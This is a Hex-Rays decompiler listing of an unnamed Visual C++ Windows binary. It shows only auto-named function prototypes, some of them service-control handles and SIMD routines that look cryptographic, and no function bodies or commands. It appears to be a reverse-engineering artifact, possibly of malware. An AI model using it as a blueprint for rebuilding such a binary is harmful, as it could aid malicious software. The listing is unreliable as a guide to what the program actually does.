/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

unsigned int sub_401000();
// BOOL __usercall sub_4010C0@<eax>(FILE *a1@<esi>);
int __fastcall sub_4011C0(void *a1, char *a2, int a3, void *a4);
// int __usercall sub_4015D0@<eax>(int a1@<ebx>, CHAR *a2@<edi>, int a3, void *a4, void *a5);
HANDLE __cdecl sub_401640(int a1, const char *a2, int a3, int a4, void *a5, void *a6);
// BOOL __usercall sub_401C10@<eax>(DWORD a1@<eax>, DWORD a2@<edx>);
SC_HANDLE sub_401C80();
SC_HANDLE sub_401D10();
int __stdcall sub_4020B0(int, int); // weak
int __cdecl main(int argc, const char **argv, const char **envp);
// int __usercall sub_402170@<eax>(__m128 a1@<xmm5>, int a2, int a3, int a4, int a5);
int __cdecl sub_402260(int C, __m128 *a2, const __m128i *a3, int a4);
int __cdecl sub_4022B0(int a1, __m128 *a2, const __m128i *a3, unsigned int a4);
// int __usercall sub_402300@<eax>(__m128 a1@<xmm5>, int a2, int a3, _DWORD *Src);
// int __usercall sub_402400@<eax>(__m128 a1@<xmm5>, int C, int a3, _DWORD *a4, int a5);
// int __usercall sub_402500@<eax>(__m128 a1@<xmm5>, int C, int a3, void *Src, int a5);
// int __usercall sub_4025D0@<eax>(__m128 a1@<xmm5>, int a2, int a3, void *Src, int a5);
_DWORD __cdecl sub_402730(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int __cdecl sub_402890(int C, char *a2, char *a3, int a4);
int __cdecl sub_402950(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_4029C0(int C, _BYTE *a2, _BYTE *a3, int a4);
int __cdecl sub_402A30(int C, _BYTE *a2, _BYTE *a3, int a4);
int __cdecl sub_402AB0(int C, int a2, _BYTE *a3, int a4);
int __cdecl sub_402B30(int C, int a2, int a3, unsigned int a4);
int __cdecl sub_402C90(int C, _BYTE *a2, _BYTE *a3, int a4);
void *sub_402D40();
void *sub_402D60();
void *sub_402D80();
void *sub_402DA0();
void *sub_402DC0();
void *sub_402DE0();
void *sub_402E00();
void *sub_402E20();
void *sub_402E40();
void *sub_402E60();
void *sub_402E80();
void *sub_402EA0();
void *sub_402EC0();
void *sub_402EE0();
void *sub_402F00();
void *sub_402F20();
void *sub_402F40();
void *sub_402F60();
void *sub_402F80();
void *sub_402FA0();
void *sub_402FC0();
int __cdecl sub_402FE0(int C); // idb
int __cdecl sub_403030(int C, int a2, int Size, _DWORD *Src);
int __cdecl sub_4034E0(int, int, void *Src); // idb
int __fastcall sub_403610(unsigned int a1, int a2, int a3, int a4);
int __cdecl sub_4037C0(int a1, _BYTE *a2, char *a3, unsigned int a4);
void *sub_403920();
void *sub_403940();
void *sub_403960();
int __cdecl sub_403980(int a1, int a2, int a3, int a4);
int __cdecl sub_403A10(int C, int, int, int); // idb
BOOL __cdecl sub_403B80(int C, char *a2, char *a3, unsigned int a4);
void *sub_403C50();
void *sub_403C70();
int __cdecl sub_403C90(int C, int a2, size_t Size, _DWORD *Src);
int __cdecl sub_403F10(int C, int, void *Src); // idb
unsigned int __fastcall sub_403FF0(_DWORD *a1, _DWORD *a2, int C, unsigned int a4);
unsigned int __cdecl sub_404210(int C, int *a2, char *a3, int a4);
void *sub_4044D0();
void *sub_4044F0();
void *sub_404510();
int __cdecl sub_404530(int C, int a2, void *Src); // idb
size_t __cdecl sub_4045F0(int a1, int *a2, void *Src, size_t Size);
void *sub_404730();
void *sub_404740();
void *sub_404750();
void *sub_404760();
void *sub_404770();
void *sub_404780();
int __cdecl sub_404790(int C, int a2, size_t Size, void *Src); // idb
int __cdecl sub_404920(int, int, void *Src); // idb
int __cdecl sub_404AC0(int a1, int a2, char *Src, size_t Size);
int __cdecl sub_404DF0(int a1);
void *sub_404E10();
void *sub_404E30();
void *sub_404E50();
int __cdecl sub_404E70(int a1);
int __cdecl sub_404F50(volatile LONG *Block);
int __cdecl sub_404FE0(int a1, int a2);
int __cdecl sub_404FF0(int a1);
int __cdecl sub_405000(int a1, int a2);
int __cdecl sub_405010(int a1, int a2);
int __cdecl sub_405020(int a1, int a2);
int __cdecl sub_405030(int a1, int a2);
int __cdecl sub_405040(int a1, int a2, int a3);
int __cdecl sub_405110(int a1, int a2, int a3);
int __cdecl sub_4051D0(int a1, int a2);
int __cdecl sub_405290(_DWORD *a1, int a2, int a3);
int __cdecl sub_405340(int a1, int a2, int a3);
int __cdecl sub_405390(_DWORD *a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_4054B0(_DWORD *a1, int a2);
int *__cdecl sub_405500(int **a1, int a2);
int __cdecl sub_405540(int a1);
int __cdecl sub_405550(volatile LONG *Block);
_DWORD *__cdecl sub_405580(_DWORD *a1);
void sub_4055A0();
int __cdecl sub_4055E0(_DWORD *a1, int a2, int a3, int a4);
char **sub_405610();
void __cdecl sub_405630(volatile LONG *Block);
int __cdecl sub_405720(int a1, int a2, int a3);
int __cdecl sub_405730(int a1, int a2);
int __cdecl sub_405760(void ***a1, void **a2, void **a3, void **a4);
int __cdecl sub_4057D0(_DWORD *a1);
int sub_405910();
int __cdecl sub_405920(void *a1); // idb
void *sub_405990();
void __cdecl sub_4059B0(void *Block);
// BOOL __usercall sub_4059D0@<eax>(int a1@<ecx>, unsigned int a2@<esi>, int a3);
BOOL __cdecl sub_405A00(_DWORD *a1, char *a2, int *a3, char *Src, int Size);
int __cdecl sub_405C50(_DWORD *a1, int a2, _DWORD *a3);
BOOL __cdecl sub_405D40(_DWORD *a1, char *a2, int *a3, char *Src, int Size);
int __cdecl sub_405F00(_DWORD *a1, int a2, int *a3);
int __cdecl sub_406060(int a1, int a2);
int __cdecl sub_406090(int a1, int a2, int a3, int a4);
int __cdecl sub_406120(int a1, int a2);
int __cdecl sub_406160(void *a1, int a2); // idb
int __cdecl sub_406270(int **a1, int *a2, int *a3, int a4, void *Src, int a6);
BOOL __cdecl sub_406560(_DWORD *a1, char *a2, int *a3, char *a4, int a5);
int __cdecl sub_406580(_DWORD *a1, int a2, int *a3);
int __cdecl sub_4065A0(int **a1, int *a2, int *a3, int a4, void *Src);
int __cdecl sub_4065D0(int **a1, int *a2, int *a3, int a4, void *Src);
int __cdecl sub_406600(_DWORD *a1, int a2);
int __cdecl sub_406660(int (__cdecl *a1)(char *, unsigned int, int), int a2);
int __cdecl sub_406770(int a1, int a2, int a3);
int __cdecl sub_406790(int a1);
int __cdecl sub_4067B0(int a1);
void *sub_4067E0();
_DWORD *__cdecl sub_4067F0(const char *a1, int a2);
// int __usercall sub_406880@<eax>(_DWORD *a1@<edi>, int a2);
int __cdecl sub_406920(_DWORD *a1);
int __cdecl sub_406940(_DWORD *a1);
// int __usercall sub_406960@<eax>(_DWORD *a1@<esi>, int a2);
int __cdecl sub_4069E0(int a1);
int __cdecl sub_406A30(int a1, void *a2, int a3); // idb
size_t __cdecl sub_406AA0(int a1, void *Src, size_t Size);
int __cdecl sub_406B70(_DWORD *a1, int a2, int a3, int *a4);
int __cdecl sub_406D70(int a1, _BYTE *a2, int a3);
size_t __cdecl sub_406DE0(int a1, void *Src);
int __cdecl sub_406E10(_DWORD *a1);
int __cdecl sub_406E80(int a1);
int sub_406EB0();
void **sub_406F30();
void **__cdecl sub_406F80(int a1, int a2, double a3);
int sub_406FF0();
int sub_407050();
int __cdecl sub_4070B0(_DWORD *a1, int a2, int a3, void *a4);
int __cdecl sub_4070E0(int a1);
int __cdecl sub_407100(int a1, int a2, int a3, int a4);
int __cdecl sub_407110(int a1, int a2, int a3, int a4);
int __cdecl sub_407120(int a1, int a2, int a3, int a4);
int __cdecl sub_407130(int a1, int a2, int a3, int a4);
// void **__usercall sub_407140@<eax>(int *a1@<esi>, _DWORD *a2, int a3, int a4);
// int *__usercall sub_407220@<eax>(__m64 a1@<mm0>, int a2, int *Block);
int __cdecl sub_4073D0(int a1);
int __cdecl sub_4073E0(int a1);
int __cdecl sub_4073F0(int a1);
int __cdecl sub_407400(int a1);
int __cdecl sub_407410(int a1);
int __cdecl sub_407420(int a1);
// int __cdecl _tolower(int C);
int __cdecl sub_407440(int a1);
int __cdecl sub_407450(int a1);
int __cdecl sub_407460(int a1, int a2);
int __cdecl sub_407470(int a1);
int __cdecl sub_407480(int a1);
_DWORD *__cdecl sub_4074B0(int a1, int a2);
void __cdecl sub_4074E0(void *Block);
int __cdecl sub_407500(int a1, int a2);
int __cdecl sub_407520(int a1, int a2);
int __cdecl sub_407540(int a1, int a2);
int __cdecl sub_407560(int a1, int a2);
// void __cdecl std::spfun(struct std::ios_base *, int); idb
int __cdecl sub_407590(int a1, int a2);
int __cdecl sub_4075A0(int a1, int a2);
int __cdecl sub_4075B0(int a1, int a2);
int __cdecl sub_4075C0(int a1, int a2);
int __cdecl sub_4075D0(int a1, int a2);
int __cdecl sub_4075E0(int a1, _DWORD *a2);
int __cdecl sub_407650(int a1, _DWORD *a2);
int __cdecl sub_4076A0(unsigned int *a1);
int __cdecl sub_4078F0(int a1, _DWORD *a2);
int __cdecl sub_407960(int a1, _DWORD *a2);
void *__cdecl sub_4079C0(char *Src, size_t Size, void *a3);
unsigned int __cdecl sub_407A30(_DWORD *a1);
_DWORD *__cdecl sub_407A70(int a1);
int sub_407AB0();
void __cdecl sub_407B50(char *Block);
void sub_407BB0();
// int __usercall sub_407BD0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
struct _RTL_CRITICAL_SECTION *sub_407C50();
int sub_407C70();
int __cdecl sub_407CD0(int a1, _DWORD *a2);
int __cdecl sub_407CF0(int a1, _DWORD *a2);
int sub_407D70();
int __cdecl sub_407DC0(int a1);
int __cdecl sub_407E50(int a1);
_DWORD *__cdecl sub_407EE0(int a1);
BOOL sub_407F90();
char *sub_407FB0();
int sub_408040();
void __cdecl sub_408090(int a1, int a2);
void __cdecl sub_408110(int a1, int a2);
int sub_4081F0();
int sub_408220();
int __cdecl sub_408310(int a1, __int16 a2, __int16 a3, int a4, int a5);
int sub_408400();
const char *__cdecl sub_408480(unsigned int a1, char *Str, unsigned int a3);
void sub_4085E0();
void sub_408610(int a1, ...);
int __cdecl sub_408630(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int sub_408730();
int sub_408760();
_OWORD *__cdecl sub_408780(__m128 *a1, _OWORD *a2, int a3);
_OWORD *__cdecl sub_4087D0(__m128 *a1, _OWORD *a2, int a3);
// void __usercall sub_408820(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>);
// void __usercall sub_408880(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>);
// void __usercall sub_4088E0(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>);
// void __usercall sub_408960(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>);
// void __usercall sub_4089E0(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>, __m128i a6@<xmm5>);
// void __usercall sub_408A70(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>, __m128i a6@<xmm5>);
// int __usercall sub_408B00@<eax>(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>, __m128i a6@<xmm5>, __m128i a7@<xmm6>, __m128i a8@<xmm7>);
// void __usercall sub_408B6E(int a1@<edx>, int a2@<ecx>, __int128 _XMM0@<xmm0>, __int128 _XMM2@<xmm2>, __int128 _XMM3@<xmm3>, __int128 _XMM4@<xmm4>, __int128 _XMM5@<xmm5>, __int128 _XMM6@<xmm6>, __int128 _XMM7@<xmm7>);
// void __usercall sub_408BE0(int a1@<edx>, int a2@<ecx>, __m128 a3@<xmm2>, __m128i a4@<xmm3>, __m128i a5@<xmm4>, __m128i a6@<xmm5>, __m128i a7@<xmm6>, __m128i a8@<xmm7>);
// __int64 __usercall sub_408CC0@<xmm0>(const __m128i *a1, __m128 *a2, int a3, int a4, int a5);
// __int64 __usercall sub_409030@<xmm0>(__m128 *a1, __m128 *a2, int a3, __int128 a4);
// __int64 __usercall sub_409160@<xmm0>(__m128 *a1, __m128 *a2, int a3, __int128 a4);
void __cdecl sub_409310(__m128 *a1, __m128 *a2, unsigned int a3, __int128 a4);
int __cdecl sub_4096B0(int a1, __m128 *a2, int a3, int a4, int a5, __m128 *a6);
int __cdecl sub_409C40(int a1, __m128 *a2, int a3, int a4, int a5, __m128 *a6);
unsigned int __cdecl sub_40A230(const __m128i *a1, __m128 *a2, int a3, int a4, unsigned int a5, const __m128i *a6, const __m128i *a7, const __m128i *a8);
unsigned int __cdecl sub_40A8B0(const __m128i *a1, __m128 *a2, int a3, int a4, unsigned int a5, const __m128i *a6, const __m128i *a7, const __m128i *a8);
unsigned int __cdecl sub_40AF30(const __m128i *a1, __m128 *a2, unsigned int a3, int a4, __m128 *a5, int a6);
// int __usercall sub_40B2C0@<eax>(int a1@<eax>, __m128i *a2@<edx>, int a3@<ecx>, __m128 a4@<xmm5>);
// int __usercall sub_40B3B0@<eax>(_OWORD *a1@<edx>, __int128 a2@<xmm0>);
// __m128 __usercall sub_40B3B6@<xmm0>(__m128 a1@<xmm0>, __m128 a2@<xmm1>, __m128 a3@<xmm4>);
// int __usercall sub_40B530@<eax>(_OWORD *a1@<edx>, int a2@<ecx>, __int128 a3@<xmm0>);
// __m128i __usercall sub_40B540@<xmm0>(__m128 a1@<xmm0>, __m128i a2@<xmm1>, __m128 a3@<xmm4>);
// void __usercall sub_40B580(__m128 *a1@<edx>, __m128 a2@<xmm0>, __m128 a3@<xmm2>, __m128 a4@<xmm5>);
// int __usercall sub_40B6E0@<eax>(_OWORD *a1@<edx>, __int128 a2@<xmm2>);
// __m128 __usercall sub_40B6E6@<xmm0>(__m128 a1@<xmm0>, __m128 a2@<xmm1>, __m128 a3@<xmm4>);
// void __usercall sub_40B700(_OWORD *a1@<edx>, __int128 a2@<xmm0>);
// int __usercall sub_40B800@<eax>(__m128 a1@<xmm5>, int a2, int a3, __m128i *a4);
// int __usercall sub_40B820@<eax>(__m128 a1@<xmm5>, int a2, int a3, __m128i *a4);
// int __usercall sub_40B940@<eax>(unsigned int *a1@<edx>, int a2);
const __m128i *__cdecl sub_40BC80(__m128i *a1, int a2, void (__cdecl *a3)(__m128i *, __m128i *, int));
int __cdecl sub_40BD70(int a1, _DWORD *a2, unsigned int a3);
int __cdecl sub_40BEE0(int a1, _BYTE *a2, unsigned int a3);
int __cdecl sub_40BFD0(int a1, int a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_40C240(int a1, char *a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_40C4A0(int a1, _BYTE *a2, _BYTE *a3, unsigned int a4, void (__cdecl *a5)(_BYTE *, _BYTE *, int, int, int));
int __cdecl sub_40C6A0(int a1, char *a2, _BYTE *a3, unsigned int a4, void (__cdecl *a5)(char *, _BYTE *, int, int, int));
int __cdecl sub_40C8A0(int a1, _BYTE *a2, unsigned int a3);
void *__cdecl sub_40C970(int a1, void *a2, size_t Size);
_DWORD *__cdecl sub_40C9B0(_DWORD *a1, int a2, char a3, int a4, int a5);
int __cdecl sub_40CA00(char *a1, void *Src, unsigned int a3, int a4);
unsigned int __cdecl sub_40CA70(int a1, _BYTE *a2, unsigned int a3);
int __cdecl sub_40CB30(char *a1, _DWORD *a2, int *a3, unsigned int a4);
int __cdecl sub_40CD90(char *a1, char *a2, int *a3, unsigned int a4);
// __int64 __usercall sub_40CFA0@<edx:eax>(__int64 result@<edx:eax>, int a2@<ecx>);
int __cdecl sub_40CFE0(int a1, int a2, int a3, unsigned int a4, int (__cdecl *a5)(int, int, unsigned int, int, int, int));
int __cdecl sub_40D1E0(int a1, int a2, int a3, unsigned int a4, int (__cdecl *a5)(int, int, unsigned int, int, int, int));
unsigned int __cdecl sub_40D390(unsigned __int8 *a1, void *a2, unsigned int a3);
// _BYTE *__usercall sub_40D3D0@<eax>(int a1@<edx>, char a2@<bl>, int a3@<edi>);
void *__cdecl sub_40D530(_DWORD *a1, unsigned int a2);
int __cdecl sub_40D5F0(int *a1, int a2, int a3, void (__cdecl *a4)(int *, int *, int), int a5, int a6);
int __cdecl sub_40D750(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_40D7D0(int a1, void *Src, size_t Size, int a4); // idb
int __cdecl sub_40D960(int a1, int a2, unsigned int a3);
int __cdecl sub_40DBA0(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_40DEC0(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_40E1E0(int a1, _BYTE *a2, int a3);
int __cdecl sub_40E2F0(int a1, void *a2, size_t Size); // idb
int __cdecl sub_40E330(int a1);
// int __usercall sub_40E380@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
// int __usercall sub_40E6E0@<eax>(int a1@<ebp>, __m64 *a2@<edi>, __m64 a3@<mm0>, __m64 a4@<mm4>);
// unsigned int __usercall sub_40E8F0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>);
int __cdecl sub_40F780(__m64 *a1, __m64 *a2, __m64 *a3);
// int __usercall sub_40F830@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
// int __usercall sub_40FCB0@<eax>(int a1@<ebp>, __m64 *a2@<edi>, __m64 a3@<mm0>, __m64 a4@<mm4>);
// int __usercall sub_40FF80@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, _DWORD *a6@<edi>);
int __cdecl sub_410DC0(__m64 *a1, __m64 *a2, __m64 *a3);
int __cdecl sub_411500(int a1, int *a2, int a3, int *a4);
int __cdecl sub_4117D0(_DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl sub_4117E0(_DWORD, _DWORD, _DWORD); // weak
void sub_411E40();
// __m128i __usercall sub_411E50@<xmm0>(const __m128i *a1@<edx>, const __m128i *a2@<ebp>, __m128i a3@<xmm0>, __m128i a4@<xmm6>, __m128i a5@<xmm7>);
// __m128i __usercall sub_411F90@<xmm0>(const __m128i *a1@<edx>, const __m128i *a2@<ebp>, __m128i a3@<xmm0>, __m128i a4@<xmm6>, __m128i a5@<xmm7>);
_DWORD __cdecl sub_412100(__int128, __int128); // weak
// __m128i __usercall sub_412280@<xmm0>(__m128i a1@<xmm6>, __m128i a2@<xmm7>);
int __cdecl sub_4122A0(int a1, __m128i a2);
// __m128i __usercall sub_4122CB@<xmm0>(const __m128i *a1@<ebp>, __m128i a2@<xmm0>, __m128i a3@<xmm7>);
// __m128i __usercall sub_412370@<xmm0>(const __m128i *a1@<ebx>, int a2@<ebp>, __m128i a3@<xmm0>);
// void __usercall sub_4123A0(__m128i *a1@<edx>, int a2@<ecx>, const __m128i *a3@<ebp>, int a4@<edi>, __m128i a5@<xmm0>);
_DWORD __cdecl sub_4124A0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl sub_4124F0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_412550(__m128i a1@<xmm6>, __m128i a2@<xmm7>, const __m128i *a3, __m128i *a4, const __m128i *a5);
// void __usercall sub_412590(__m128i a1@<xmm6>, __m128i a2@<xmm7>, const __m128i *a3, __m128i *a4, const __m128i *a5);
// void __usercall sub_4125D0(__m128i a1@<xmm6>, __m128i a2@<xmm7>, const __m128i *a3, int a4, unsigned int a5, __m128i a6, int *a7);
_DWORD *__cdecl sub_4126B0(char *a1, char *a2, unsigned int a3, int a4, _DWORD *a5, void (__cdecl *a6)(char *, char *, int));
char __cdecl sub_412850(char *a1, char *a2, unsigned int a3, int a4, char *a5, void (__cdecl *a6)(char *, int *, int));
unsigned int *__cdecl sub_412AF0(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6, int (__cdecl *a7)(int, int, int));
unsigned int *__cdecl sub_412C00(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, unsigned int *a6, int a7, void (__cdecl *a8)(int, int, int));
char __fastcall sub_412E30(void (__cdecl *a1)(int *, int *, int), _BYTE *a2, int a3, int a4, int a5, int *a6, int a7);
char __cdecl sub_413000(int a1, int a2, unsigned int a3, int a4, int *a5, int a6, int a7, void (__cdecl *a8)(int *, int *, int));
char __cdecl sub_4130A0(_BYTE *a1, int a2, int a3, int a4, int *a5, int a6, int a7, void (__cdecl *a8)(int *, int *, int));
int __fastcall sub_4130F0(int a1, int a2);
int *__cdecl sub_413120(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, _DWORD *a6, int *a7, void (__cdecl *a8)(int, _DWORD *, int));
int __fastcall sub_413240(int a1, int a2);
int __cdecl sub_413270(_BYTE *a1, _BYTE *a2, unsigned int a3, int a4, int a5, _DWORD *a6, int *a7, void (__cdecl *a8)(_DWORD *, _DWORD *, unsigned int, int, int));
_DWORD *__cdecl sub_4133B0(_DWORD *a1, _DWORD *a2, _DWORD *a3);
void *__cdecl sub_4133F0(size_t Size);
void *__cdecl sub_413430(size_t Size);
void __cdecl sub_413490(void *Block);
void __cdecl sub_4134B0(_BYTE *Block, int a2);
void *__cdecl sub_413500(void *Block, size_t Size, int a3, int a4);
_BYTE *__cdecl sub_4135B0(_BYTE *Src, size_t a2, size_t Size);
unsigned int __cdecl sub_413680(int a1);
int __cdecl sub_4139E0(_BYTE *a1, unsigned int a2);
int __cdecl sub_413A50(char *a1, _BYTE *a2, int a3);
int sub_413B90();
int __cdecl sub_413BB0(unsigned int *a1, unsigned int a2);
int __cdecl sub_413C50(unsigned int *a1, unsigned int a2);
int __cdecl sub_413CD0(int *a1, int *a2, char *a3, char *a4, unsigned int a5, int a6);
size_t __cdecl sub_414080(int a1, int *a2, _DWORD *a3, void *Src, size_t Size, void (__cdecl *a6)(int *, int *, int));
int __fastcall sub_4141C0(int *a1, void (__cdecl *a2)(int *, int *, int), int a3, _DWORD *a4, char *a5, int a6);
int __cdecl sub_414300(int a1, _BYTE *a2, char *a3, int *a4, int a5, void (__cdecl *a6)(int *, int *, int));
size_t __cdecl sub_4143A0(int a1, int *a2, int *a3, void *Src, int Size, void (__cdecl *a6)(int *, int *, int));
unsigned int __cdecl sub_4144E0(int a1, _BYTE *a2, int *a3, void *Src, size_t Size, void (__cdecl *a6)(int *, int *, int));
struct _RTL_CRITICAL_SECTION *sub_414650();
int __cdecl sub_414690(LPCRITICAL_SECTION lpCriticalSection); // idb
int __cdecl sub_4146B0(LPCRITICAL_SECTION lpCriticalSection); // idb
void __cdecl sub_4146D0(LPCRITICAL_SECTION lpCriticalSection);
BOOL __cdecl sub_414700(volatile LONG *Destination, void (*a2)(void));
BOOL __cdecl sub_414750(DWORD *a1);
LPVOID __cdecl sub_414770(DWORD *a1);
BOOL __cdecl sub_414780(DWORD *a1, LPVOID lpTlsValue);
BOOL __cdecl sub_4147A0(DWORD *a1);
// DWORD __stdcall GetCurrentThreadId();
BOOL __cdecl sub_4147D0(int a1, int a2);
int __cdecl sub_4147E0(volatile LONG *Addend, LONG Value, _DWORD *a3);
void __cdecl sub_414800(void *Block);
void sub_414820();
int __cdecl sub_414870(int *a1, int a2, int a3);
int sub_414940(); // weak
// char *__usercall sub_414960@<eax>(unsigned int a1@<esi>);
int __cdecl sub_4149D0(unsigned int a1, int a2, int a3, int a4, int a5, int a6);
char *__cdecl sub_414B00(unsigned int a1, int a2, int **a3);
int __cdecl sub_414C40(unsigned int a1, int *a2, int *a3);
void __cdecl sub_414DC0(unsigned int a1, int a2, int **a3);
int sub_414F10();
char **sub_414F30();
int __cdecl sub_414F40(int Size, void *Src, char *a3, int a4, int a5);
// int __usercall sub_415200@<eax>(_DWORD *a1@<ebx>, int a2@<esi>, __m64 a3@<mm0>, int *Block);
// int __usercall sub_415280@<eax>(_DWORD *a1@<ecx>, int *a2@<ebx>, struct _RTL_CRITICAL_SECTION *a3@<esi>, __m64 a4@<mm0>, int *a5);
// int __usercall sub_4152C0@<eax>(__m64 a1@<mm0>, size_t Size, void *Src, char *a4, int a5, int a6);
// int __usercall sub_415660@<eax>(__m64 a1@<mm0>, int a2, _BYTE *a3, void *a4, int a5, int a6);
int __cdecl sub_4159F0(int a1, _BYTE *a2, void *a3, int a4, int a5);
int __cdecl sub_415CB0(unsigned int **a1, _DWORD *a2, int a3, int *a4);
int __cdecl sub_416100(int a1);
int __cdecl sub_416110(_DWORD **a1);
int __cdecl sub_416140(_DWORD *a1);
int __cdecl sub_416170(volatile LONG *Block, int a2);
int __cdecl sub_416200(_DWORD *a1);
int __cdecl sub_4162A0(volatile LONG *Block);
void __cdecl sub_416360(void *Block);
int __cdecl sub_4163B0(int *a1, unsigned int **a2, int a3, int *a4);
BOOL __cdecl sub_416420(int a1);
DWORD __cdecl sub_416440(int a1);
int __cdecl sub_416450(LPCRITICAL_SECTION lpCriticalSection); // idb
int __cdecl sub_416460(LPCRITICAL_SECTION lpCriticalSection); // idb
_DWORD *__cdecl sub_416470(int a1, int a2, int a3);
// _DWORD *__usercall sub_416560@<eax>(__m64 a1@<mm0>, _DWORD *a2, int a3, int a4, int *a5, int a6, int a7);
// int __usercall sub_4166D0@<eax>(__m64 a1@<mm0>, int a2, int *a3);
// int __usercall sub_416780@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int a4, int *a5);
void **sub_416820();
int __cdecl sub_416830(unsigned int a1);
_DWORD *__cdecl sub_416880(_DWORD *a1);
_DWORD *sub_4168C0();
_DWORD *sub_416900();
int __cdecl sub_416940(_DWORD *a1);
int __cdecl sub_416960(_DWORD *a1, int *a2);
int __cdecl sub_4169B0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_416A50(_DWORD *a1, int a2);
int __cdecl sub_416A90(int a1, int a2, int a3);
int __cdecl sub_416AE0(int a1, int a2, int a3, int a4);
int __cdecl sub_416B80(int a1, _DWORD *a2, _DWORD *a3, int a4);
int __cdecl sub_416D10(int a1, int a2);
BOOL __cdecl sub_416D80(int a1, int a2);
BOOL __cdecl sub_416DB0(int a1);
BOOL __cdecl sub_416DC0(int a1);
int __cdecl sub_416DE0(int a1, int a2);
BOOL __cdecl sub_416E20(int a1);
BOOL __cdecl sub_416E40(int a1);
// int __usercall sub_416E50@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, int a4, int *a5);
_DWORD *__cdecl sub_416E80(_DWORD *a1, _DWORD *a2, int a3);
void *sub_416EC0();
void __cdecl sub_416F00(void *Block);
int __cdecl sub_416F20(int a1, int a2);
int __cdecl sub_416F30(int a1, int a2);
_DWORD *__cdecl sub_416F40(_DWORD *a1, int a2, int a3);
int __cdecl sub_416F60(_DWORD *a1);
int __cdecl sub_416F90(_DWORD *a1);
void __cdecl sub_416FC0(int a1);
void __cdecl sub_417000(_DWORD *Block);
void __cdecl sub_417060(void **Block);
_DWORD *__cdecl sub_4170D0(int a1, int a2);
_DWORD *__cdecl sub_4171F0(int a1, int a2);
// int __usercall sub_417240@<eax>(char *a1@<ecx>, _DWORD *a2@<ebx>, int a3);
int __cdecl sub_4172E0(_DWORD *a1, char *a2, int a3);
int __cdecl sub_417300(_DWORD *a1, char *a2);
int __cdecl sub_417320(_DWORD *a1, int a2);
int __cdecl sub_417390(int a1, int a2);
_DWORD *__cdecl sub_4173C0(int a1, int a2);
_DWORD *__cdecl sub_4173E0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_417490(_DWORD *a1, int a2);
int __cdecl sub_4174D0(_BYTE *a1, int a2, int a3);
int __cdecl sub_417640(_DWORD *a1, int a2);
void **__cdecl sub_4176D0(int a1);
int sub_417720();
int __cdecl sub_417730(_DWORD *a1);
int __cdecl sub_417760(_DWORD *a1);
_DWORD *sub_417790();
int __cdecl sub_4177A0(int a1, int a2);
void sub_4177C0();
int sub_4178F0();
HANDLE sub_417A30(LPCCH lpMultiByteStr, ...);
void __cdecl __noreturn sub_417C70(const char *a1, const char *Args, int a3);
int sub_417CA0();
int __cdecl sub_417CB0(int *a1);
int __cdecl sub_417D00(int *a1);
_DWORD *__cdecl sub_417D50(int a1);
int __cdecl sub_417D70(int a1, int a2);
double __cdecl sub_417DC0(int a1);
// int __usercall sub_417DE0@<eax>(const void **a1@<ebx>, void **a2@<edi>, size_t *a3@<esi>, unsigned int *a4, char a5);
int __fastcall sub_417EE0(int a1, const void **a2, void **a3, size_t *a4, unsigned int *a5, char *a6, char a7, int a8);
int __fastcall sub_418040(void **a1, size_t *a2, const void **a3, unsigned int *a4, __int64 a5, unsigned int a6, int a7, int a8, char a9);
int __fastcall sub_418340(size_t *a1, unsigned int *a2, const void **a3, void **a4, double a5, int a6, int a7, char a8, int a9);
int __cdecl sub_418A30(const void **a1, void **a2, unsigned int *a3, _DWORD *a4, _DWORD *a5, char *a6, int *a7);
int __cdecl sub_419090(int a1, char *a2, int *a3);
int sub_419190(int a1, char *a2, ...);
unsigned int __cdecl sub_4191B0(int a1, int a2, char *a3, int a4);
int __cdecl sub_419210(int a1);
